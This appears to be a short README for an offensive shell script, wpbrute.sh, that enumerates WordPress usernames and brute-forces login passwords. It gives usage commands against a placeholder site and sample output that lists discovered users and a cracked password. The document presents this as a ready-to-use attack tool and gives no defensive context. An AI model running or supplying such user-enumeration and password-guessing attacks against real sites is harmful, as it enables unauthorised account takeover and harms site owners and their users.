# Wordpress-Bruteforce



Wordpress user enumeration and password bruteforce.

#User Enumeration:

$ ./wpbrute.sh --url=www.example.com

[+] Username or nickname enumeration
admin
testuser


#Password Bruteforce:

$ ./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt

[+] Bruteforcing user [admin]
123456
test123
123test123
The password is: 123test123
</pre>
